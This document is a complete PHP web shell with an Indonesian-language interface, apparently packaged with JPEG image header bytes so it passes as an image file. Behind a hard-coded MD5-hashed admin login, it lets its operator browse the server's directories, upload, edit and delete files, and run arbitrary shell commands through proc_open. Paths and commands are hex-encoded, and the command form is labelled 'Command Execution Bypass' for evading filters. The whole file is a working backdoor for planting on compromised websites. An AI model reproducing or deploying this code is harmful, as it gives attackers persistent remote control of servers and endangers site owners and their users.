<?php
session_start();

$username = "admin";
$passwordHash = "48dd3046643b6bf08f2a6d9be1b0dd26";

// Autentikasi
if (isset($_POST['username']) && isset($_POST['password'])) {
    $inputUsername = $_POST['username'];
    $inputPassword = md5($_POST['password']);

    if ($inputUsername === $username && $inputPassword === $passwordHash) {
        $token = generateUUID(); // Fungsi generateUUID dijelaskan di bawah
        $_SESSION['token'] = $token;
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $username;
    } else {
        echo "Login gagal!";
        exit;
    }
}

// Cek sesi autentikasi
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>
    <form method="POST">
        <label>Username:</label>
        <input name="username"><br>
        <label>Password:</label>
        <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    <?php
    exit;
}

// Sesi autentikasi sukses, lanjutkan eksekusi kode berikutnya
$dir = isset($_GET['dir']) ? hex2bin($_GET['dir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';

function get_file_permissions($file): string {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file): bool {
    return is_writable($file);
}

function executeCommand($command)
{
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($command, $descriptorspec, $pipes);

    if (is_resource($process)) {
        // Read output from stdout and stderr
        $output_stdout = stream_get_contents($pipes[1]);
        $output_stderr = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        $return_value = proc_close($process);

        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
    } else {
        return "Failed to execute command.";
    }
}

if (isset($_GET['636d64'])) {
    $command = hex2bin($_GET['636d64']);
    $result = executeCommand($command);
}

if (isset($_FILES['file_upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $dir . '/' . $_FILES['file_upload']['name'])) {
        $upload_message = 'File berhasil diunggah.';
    } else {
        $upload_message = 'Gagal mengunggah file.';
    }
}

if (isset($_POST['edit_file'])) {
    $file = $_POST['edit_file'];
    $content = file_get_contents($file);
    if ($content !== false) {
        echo '<form method="post" action="">';
        echo '<textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control">' . htmlspecialchars($content) . '</textarea>';
        echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '">';
        echo '<button type="submit" name="submit_edit" class="btn btn-outline-light">Submit</button>';
        echo '</form>';
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if (file_put_contents($file, $content) !== false) {
        $edit_message = 'File berhasil diedit.';
    } else {
        $edit_message = 'Gagal mengedit file.';
    }
}

if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (unlink($file)) {
        $delete_message = 'File berhasil dihapus.';
    } else {
        $delete_message = 'Gagal menghapus file.';
    }
}

$uname = php_uname();
$current_dir = realpath($dir);

function generateUUID()
{
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIMPEL BANGET NIH SHELL</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 50%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 0.5rem;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 1rem 0;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
        <h1>SIMPEL BANGET NIH SHELL</h1>
    </header>
    <main>
        <p>Current directory: <?php echo $current_dir; ?></p>
        <p>Server information: <?php echo $uname; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo $upload_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo $edit_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo $delete_message; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo $dir; ?>">
        </form>
        <table>
            <tr>
                <th>Filename</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($files as $file): ?>
            <tr>
                <td>
                    <?php if (is_dir($dir . '/' . $file)): ?>
                    <a href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
                    <?php else: ?>
                    <span style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></span>
                    <?php endif; ?>
                </td>
                <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
                    <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
                </td>
                <td>
                    <?php if (is_file($dir . '/' . $file)): ?>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-outline-light">Edit</button>
                    </form>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-outline-light">Delete</button>
                    </form>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
    <p><b>Command Execution Bypass</b></p>
    <form method="GET">
        <label>encode your command on <b>https://encode-decode.com/bin2hex-decode-online/ :</b></label><br><br>
        <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c"><br><br>
        <input type="submit" value="Execute">
    </form>

    <?php if (isset($result)): ?>
        <h2>Result:</h2>
        <pre><?php echo htmlspecialchars($result); ?></pre>
    <?php endif; ?>
        </table>
    </main>
</body>
</html>
????JFIFxx??"
??C		



	
??C??"??	
???}!1AQa"q2???#B??R??$3br?	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz???????????????????????????????????????????????????????????????????????????	
???w!1AQaq"2?B????	#3R?br?
$4?%?&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz??????????????????????????????????????????????????????????????????????????????N????m????j???EP??
